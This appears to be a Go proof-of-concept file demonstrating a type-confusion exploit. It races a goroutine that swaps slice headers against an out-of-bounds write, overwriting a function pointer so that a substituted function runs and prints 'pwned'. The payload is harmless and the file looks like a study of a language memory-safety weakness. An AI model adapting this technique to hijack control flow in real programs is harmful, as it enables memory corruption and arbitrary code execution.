package main

import (
	"go.andmed.org/gopwn"
)

func main() {
	println("start")

	var long = make([]*uintptr, 2)
	var short = make([]*uintptr, 1)


	var goodFn = func() bool {
		return false
	}
	var target = new(struct {
		f func() bool
	})
	target.f = goodFn

	// need this to avoid some optimization
	var _ = gopwn.AddressFmt(target)

	var badFn = func() bool {
		println("pwned")
		return true
	}
	badPtr := gopwn.AddressFmt(badFn)

	var confused = short
	go func() {
		var i int
		for i < 100000 {
			confused = long
			func() {
				if i >= 0 {
					return
				}
				println(confused) // never goes here
			}()
			confused = short
			i++
		}
	}()


	var pwned bool
	for true {
		func() {
			defer func() {
				recover()
			}()
			confused[1] = &badPtr
			pwned = target.f()
		}()
		if pwned {
			break
		}
	}
}
